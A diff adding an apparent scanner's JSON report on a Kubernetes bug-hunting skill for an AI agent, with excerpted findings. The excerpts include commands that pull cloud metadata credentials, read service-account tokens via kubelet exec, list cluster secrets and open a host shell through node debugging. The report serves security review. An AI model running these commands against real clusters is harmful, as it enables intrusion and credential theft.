@@ -1,0 +1,383 @@
+{
+  "id": "elementalsouls__claude-bughunter__skills~hunt-k8s",
+  "owner": "elementalsouls",
+  "repo": "Claude-BugHunter",
+  "path": "skills/hunt-k8s",
+  "name": "hunt-k8s",
+  "description": "Hunt Kubernetes & Docker — API anonymous access, kubelet 10250 exec (SPDY/WebSocket, NOT plain POST) and the simpler /run primitive, etcd 2379 unauth, dashboard skip-login, RBAC misconfig, secret/SA-token abuse, docker.sock host escape, runc/container-escape (Leaky Vessels CVE-2024-21626), API-server-mediated nodes/proxy RCE, EphemeralContainers node-shell, bound/projected SA-token audience+expiry abuse, admission-controller bypass, Helm/Tiller remnants. Use when target runs containerized infra, exposes K8s ports (6443/10250/10255/2379/8443), or cloud metadata reveals K8s service accounts.",
+  "stars": 5465,
+  "category": "security",
+  "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+  "contentHash": "6f073143606ab9533d74a748f32912c90a6071d3b7f007659b7333d8b9f0af58",
+  "repoCreatedAt": "2026-05-05T11:22:32Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 32,
+        "excerpt": "- **Blind/outbound vectors need OOB.** If you exploit SSRF→IMDS→K8s, or a pod's egress, confirm the outbound hop with a Burp Collaborator / interactsh subdomain",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 41,
+        "excerpt": "# Common Kubernetes / container ports",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 46,
+        "excerpt": "curl -sk \"https://$TARGET:6443/version\"        # {\"major\":\"1\",\"minor\":\"29\",\"gitVersion\":\"v1.29.x\"...}",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 47,
+        "excerpt": "curl -sk \"https://$TARGET:6443/api\"             # APIVersions list, even pre-auth",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 48,
+        "excerpt": "curl -sk \"https://$TARGET:6443/healthz\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 51,
+        "excerpt": "curl -s \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" # AWS EKS (IMDSv1)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 52,
+        "excerpt": "TOK=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\") # IMDSv2",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 53,
+        "excerpt": "curl -s -H \"X-aws-ec2-metadata-token: $TOK\" \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 54,
+        "excerpt": "curl -s \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" -H \"Metadata: true\"      # Azure AKS",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 55,
+        "excerpt": "curl -s \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\" -H \"Metadata-Flavor: Google\" # GKE",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "metadata.google.internal"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 64,
+        "excerpt": "SRV=\"https://$TARGET:6443\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 67,
+        "excerpt": "curl -sk \"$SRV/apis/authentication.k8s.io/v1/selfsubjectreviews\" -X POST \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 72,
+        "excerpt": "curl -sk \"$SRV/apis/authorization.k8s.io/v1/selfsubjectrulesreviews\" -X POST \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 78,
+        "excerpt": "curl -sk \"$SRV/apis/authorization.k8s.io/v1/selfsubjectaccessreviews\" -X POST \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 85,
+        "excerpt": "curl -sk \"$SRV/api/v1/secrets\" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get(\"items\",[])),\"secrets\")'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 99,
+        "excerpt": "SRV=\"https://$TARGET:10250\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 102,
+        "excerpt": "curl -sk \"$SRV/pods\" | python3 -m json.tool 2>/dev/null \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 109,
+        "excerpt": "curl -sk -X POST \"$SRV/run/$NS/$POD/$CTR\" -d \"cmd=id\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 110,
+        "excerpt": "curl -sk -X POST \"$SRV/run/$NS/$POD/$CTR\" -d \"cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 122,
+        "excerpt": "curl -sk \"$SRV/containerLogs/$NS/$POD/$CTR\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 125,
+        "excerpt": "curl -s \"http://$TARGET:10255/pods\" | python3 -m json.tool 2>/dev/null | head",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 126,
+        "excerpt": "curl -s \"http://$TARGET:10255/metrics\" | head",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 138,
+        "excerpt": "SRV=\"https://$TARGET:6443\"; H=\"-H \\\"Authorization: Bearer $TOKEN\\\"\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 138,
+        "excerpt": "SRV=\"https://$TARGET:6443\"; H=\"-H \\\"Authorization: Bearer $TOKEN\\\"\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 139,
+        "excerpt": "NODE=$(curl -sk -H \"Authorization: Bearer $TOKEN\" \"$SRV/api/v1/nodes\" | grep -o '\"name\":\"[^\"]*\"' | head -1 | cut -d'\"' -f4)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 139,
+        "excerpt": "NODE=$(curl -sk -H \"Authorization: Bearer $TOKEN\" \"$SRV/api/v1/nodes\" | grep -o '\"name\":\"[^\"]*\"' | head -1 | cut -d'\"' -f4)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 142,
+        "excerpt": "curl -sk -X POST -H \"Authorization: Bearer $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 146,
+        "excerpt": "curl -sk -H \"Authorization: Bearer $TOKEN\" \"$SRV/api/v1/nodes/$NODE/proxy/pods\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 158,
+        "excerpt": "# etcd holds ALL cluster state. Secrets are plaintext UNLESS EncryptionConfiguration is set.",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 177,
+        "excerpt": "# From RCE/LFI inside a pod:",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 183,
+        "excerpt": "echo \"$TOKEN\" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 191,
+        "excerpt": "-H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 193,
+        "excerpt": "curl -sk \"$API/api/v1/namespaces/$NS/secrets\" -H \"Authorization: Bearer $TOKEN\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 198,
+        "excerpt": "kubectl debug node/$NODE -it --image=busybox      # mounts host root at /host → chroot /host",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 201,
+        "excerpt": "-H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/strategic-merge-patch+json' \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 210,
+        "excerpt": "# docker.sock reachable (SSRF unix://, LFI of socket, or RCE on host)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 233,
+        "excerpt": "# Kubernetes Dashboard — correct API base is /api/v1/... UNDER the dashboard service.",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/hunt-k8s/SKILL.md",
+        "line": 246,
+        "excerpt": "curl -sk \"$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations\" -H \"Authorization: Bearer $TOKEN\"",
+        "disclosed": true,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "network": 37,
+      "shell": 9,
+      "reads-secrets": 9
+    },
+    "score": 84,
+    "band": "low",
+    "rulesVersion": "1.0.0",
+    "filesScanned": 2,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+      "scannedAt": "2026-11-06T19:07:48.007Z",
+      "score": 84,
+      "rulesVersion": "1.0.0"
+    }
+  ]
+}
